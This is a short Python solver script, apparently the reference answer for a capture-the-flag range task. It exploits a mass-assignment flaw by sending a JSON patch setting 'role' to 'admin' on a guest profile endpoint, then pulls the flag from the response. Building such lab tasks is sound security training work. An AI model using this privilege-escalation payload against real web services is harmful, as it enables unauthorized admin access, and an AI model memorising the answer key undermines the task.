"""Intended-path solver: mass assignment through a JSON profile patch."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PATCH = {"role": "admin"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    httpx.post(f"{base}/profile", params={"u": "guest"}, json=PATCH, timeout=10)
    res = httpx.get(f"{base}/profile", params={"u": "guest"}, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="mass-assign-role",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "no flag in profile response",
            )
        ]
    )
